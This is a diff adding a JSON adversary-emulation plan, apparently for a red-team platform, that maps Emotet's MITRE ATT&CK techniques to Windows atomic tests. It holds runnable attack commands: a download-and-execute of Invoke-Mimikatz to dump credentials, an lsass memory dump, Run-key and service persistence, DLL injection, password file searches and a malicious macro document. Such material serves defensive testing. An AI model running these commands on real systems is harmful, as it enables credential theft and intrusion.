@@ -1,0 +1,492 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "This is an atomic technique test mapped from Emotet techniques from https://attack.mitre.org/software/S0367/. Note, this is not an emulation plan, and procedures by an adversary could be drastically different",
+        "display_name": "Emotet_MITRE_ATTACK_Techniques",
+        "name": "Emotet_MITRE_ATTACK_Techniques",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"chris.scythe.services:443\",\"--secure\":true,\"--multipart\":10240}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1560-data-ps.zip}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1560"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Remove-Item -path $env:USERPROFILE\\T1560-data-ps.zip -ErrorAction Ignore}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1560",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0004",
+                    "att&ck-technique:T1547.001"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0004",
+                    "att&ck-technique:T1547.001",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0002",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock { New-Item -Type Directory (split-path PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe) -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\"}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0004",
+                    "att&ck-technique:T1543.003",
+                    "prereq-command"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {New-Service -Name \"AtomicTestService_PowerShell\" -BinaryPathName \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\"; Start-Service -Name \"AtomicTestService_PowerShell\"}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0004",
+                    "att&ck-technique:T1543.003"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Stop-Service -Name \"AtomicTestService_PowerShell\" 2>&1 | Out-Null; try {(Get-WmiObject Win32_Service -filter \"name='AtomicTestService_PowerShell'\").Delete()}; catch {}; }\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0004",
+                    "att&ck-technique:T1543.003",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock { Invoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"$env:TEMP\\Modified-SysInternalsSuite.zip\"; Expand-Archive $env:TEMP\\Modified-SysInternalsSuite.zip $env:TEMP\\sysinternals -Force; Remove-Item $env:TEMP\\Modified-SysInternalsSuite.zip -Force}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1555.003",
+                    "prereq-command"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Set-Location -path \"$env:TEMP\\Sysinternals\";; ./accesschk.exe -accepteula .;}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1555.003"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Remove-Item $env:TEMP\\Sysinternals -Force -Recurse -ErrorAction Ignore}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1555.003",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock { Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/src/Get-Inbox.ps1\" -OutFile \"PathToAtomicsFolder\\T1114.001\\src\\Get-Inbox.ps1\"}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1114.001",
+                    "prereq-command"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {powershell -executionpolicy bypass -command PathToAtomicsFolder\\T1114.001\\src\\Get-Inbox.ps1 -file $env:TEMP\\mail.csv}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1114.001"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Remove-Item $env:TEMP\\mail.csv -Force -ErrorAction Ignore; }\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1114.001",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet0 -c 5",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1040"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c c:\\windump.exe",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1040"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Test-NetConnection -ComputerName google.com -port 8081}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1571"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1027"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock { Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip\" -OutFile \"$env:temp\\T1027.zip\"; Expand-Archive -path \"$env:temp\\T1027.zip\" -DestinationPath \"$env:temp\\temp_T1027.zip\\\" -Force}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1027",
+                    "prereq-command"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"%temp%\\temp_T1027.zip\\T1027.exe\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1027"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c taskkill /f /im calculator.exe >nul 2>nul",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1027",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /S /Q %temp%\\temp_T1027.zip >nul 2>nul",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1027",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del /Q \"%temp%\\T1027.zip\" >nul 2>nul",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1027",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock { Invoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"$env:TEMP\\Procdump.zip\"; Expand-Archive $env:TEMP\\Procdump.zip $env:TEMP\\Procdump -Force; New-Item -ItemType Directory (Split-Path PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe) -Force | Out-Null; Copy-Item $env:TEMP\\Procdump\\Procdump.exe PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe -Force}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1003.001",
+                    "prereq-command"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1003.001"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del \"C:\\Windows\\Temp\\lsass_dump.dmp\" >nul 2> nul",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1003.001",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){;   return 'Please install Microsoft Excel before running this test.'; }; else{;   $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm';   $fileName = 'PhishingAttachment.xlsm';   New-Item -Type File -Force -Path $fileName | out-null;   $wc = New-Object System.Net.WebClient;   $wc.Encoding = [System.Text.Encoding]::UTF8;   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;   ($wc.DownloadString(\"$url\")) | Out-File $fileName; }}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0001",
+                    "att&ck-technique:T1566.001"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c tasklist",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock { New-Item -Type Directory (split-path PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll) -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll\" -OutFile \"PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\"}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1055",
+                    "prereq-command"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {$mypid = (Start-Process notepad -PassThru).id; mavinject $mypid /INJECTRUNNING PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1055"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c cmd.exe /c \"net use \\\\<Target Computer Name>\\C$ <Password> /u:<DOMAIN\\Administrator>\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0008",
+                    "att&ck-technique:T1021.002"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {findstr /si pass *.xml *.doc *.txt *.xls; ls -R | select-string -Pattern password}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1552.001"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock { $msword = New-Object -ComObject word.application; Stop-Process -Name WINWORD}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0002",
+                    "att&ck-technique:T1204.002",
+                    "prereq-command"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"); $macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"; Invoke-MalDoc $macrocode \"16.0\" \"Word\"}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0002",
+                    "att&ck-technique:T1204.002"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\' -Name 'AccessVBOM' -ErrorAction Ignore; }\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0002",
+                    "att&ck-technique:T1204.002",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "38": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c wmic process call create powershell.exe",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0002",
+                    "att&ck-technique:T1047"
+                ],
+                "type": "message"
+            },
+            "39": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c wmic process where name='powershell.exe' delete >nul 2>&1",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0002",
+                    "att&ck-technique:T1047",
+                    "cleanup"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
